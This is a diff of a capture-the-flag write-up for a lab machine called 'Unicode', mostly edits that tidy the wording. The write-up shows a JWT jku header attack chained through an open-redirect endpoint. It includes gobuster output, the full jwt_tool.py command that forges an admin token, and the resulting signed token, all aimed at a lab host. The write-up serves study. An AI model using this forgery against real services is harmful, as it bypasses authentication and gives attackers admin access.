@@ -1,6 +1,8 @@
 
 # Unicode
 
+- Introduction
+- Summary
 - Walkthrough
 - Mitigrations
 - References
@@ -35,13 +37,13 @@ The scan showed that port 80 was open and hosting a threat analisys company. Its
 insert screen on jwk ------------------------
 
 
-when the JWK is decoded it shows that the JWK uses the jku header that points to the URL containing the JWKS file containing the public key for verifying the token. 
+When the JWK is decoded it shows that the JWK uses the jku header that points to the URL containing the JWKS file which holds the public key for verifying the token. 
 
 
 screen of decoded jwk --------------
 
 
-If it is possible to change the jku header to point to an attacker controlled server an malicious public key can subsitiued to allow the malicious actor to forge a ticket and have the server verify it on the malicious actors server. This server has controls in place to prevent the server from verifying the token on another server. 
+If it is possible to change the jku header to point to an attacker controlled server an malicious public key can subsitiued to allow the malicious actor to forge a ticket and have the server verify it on the testers server. This server has controls in place to prevent the server from verifying the token on another server. 
 
 The tester used gobuster to bruteforce the web sites directories and found a "redirect" endpoint. 
 
@@ -59,7 +61,7 @@ Gobuster v3.1.0
 /login                (Status: 308) [Size: 258] [--> http://10.10.11.126/login/]    
 /logout               (Status: 308) [Size: 260] [--> http://10.10.11.126/logout/]   
 /pricing              (Status: 308) [Size: 262] [--> http://10.10.11.126/pricing/]  
-/redirect             (Status: 308) [Size: 264] [--> http://10.10.11.126/redirect/] 
+/redirect             (Status: 308) [Size: 264] [--> http://10.10.11.126/redirect/] <---------------------
 /register             (Status: 308) [Size: 264] [--> http://10.10.11.126/register/] 
 /upload               (Status: 308) [Size: 260] [--> http://10.10.11.126/upload/]     
                                                                                     
@@ -68,9 +70,9 @@ Gobuster v3.1.0
 ===============================================================
 
 ```
-
-Using the redirect endpoint it was possible for the tester to set the jku header to point to the redirect endpoint and set it to point to the testers host. The "jwt_tools.py" is able to do this by creating a custom JWK, which the tester then hosted using a python http server. The tester changed the JWK to point to the testers host via the redirect "http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json". The tester also changed the user claim part of payload section to admin.
+Using the redirect endpoint it was possible for the tester to set the jku header to point to the redirect endpoint and in turn set it to point to the testers host. The "jwt_tools.py" is able to do this by creating a custom JWK, which the tester then hosted using a python http server. The tester changed the JWK to point to the testers host via the redirect "http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json". The tester also changed the user claim part of the payload section to admin.
 ```
+
 ┌─[192.168.93.129]─[rang3r@parrot]─[~]
 └──╼ [★]$ python  '/home/rang3r/Documents/Tools/tools/web/jwt4/jwt_tool-master/jwt_tool.py'   eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiam9obiJ9.fUXM6uoYSqrXOEEggGoVxSw5q53TeukNNAa0wREc9_dOqPUEr1F2SBsgFdu4P18PNE4yWVYeuSexsGEL3vwWYEKE4awLbzkJnPQPj2_qF3pyVKX0NYNRI-LjpIriPZ6Z-FgnoRo47vEKQG2yMLLSmaI8FS7wrpR7OL42I3USiBh3qPBz26ZwZmtwh7b12vyaFWRsBcybq0-3I-np8eg4DQS51_ZMMNvNxv3VIF8UD3PtBr3hK1iviyfK9ZiQbgiV8SKjfnpi3rat1NQcJRJ50A3VcbbHZZ2pqe-iYruXUZf8anz4PGODYXg3m7aEScBKK8eeqiZ0rKt7gT4lrkrp7A  -X s -ju http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json  -I -pc user -pv admin  
 
@@ -85,7 +87,8 @@ jwttool_628f71f241a933abf519c578de4e8a42 - Signed with JWKS at http://hackmedia.
 [+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuNi9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.hyY-UHi_VvIfqMcM0yefE80UNOa6bOUpPOYACvbzSBCucnu-cwiCsTTQD1bTb3GDReMyytRPNY0h10PAeSW3ssLRE6UtLXDP0uXFBS_h0ArWYwfhgskcfFaPqS5Q7UvjSp9v7G0lfzUSTDdIFKSGn9ErPUVZn4DFkFaDd6lvgnpeAukCmXuP96_0dbTgZ56wgkVwWC01pKHtcm1bweMBW0OyJKvjkI1Gi_EOoTMExZichPV8vvJCB8xfa5OMvrLEaT7uB_xQ-gSuF3TCz5GkZ-7sAQcdN88cqOt1KxdPEpsI3hjVAsrVFW5jivD8XMka0o9qJFnR98jj9L5lSPaDDA
 
 ```
-The tester then set up the http server where the json file was located. The tester pasted over the old JWK in the storage sectrion of the browser and refreshed the page. 
+
+The tester then set up a http server to host the forged json file. The tester pasted over the old JWK in the storage section of the browser and refreshed the page. 
 
 ```
 ┌─[192.168.93.129]─[rang3r@parrot]─[~/.jwt_tool]
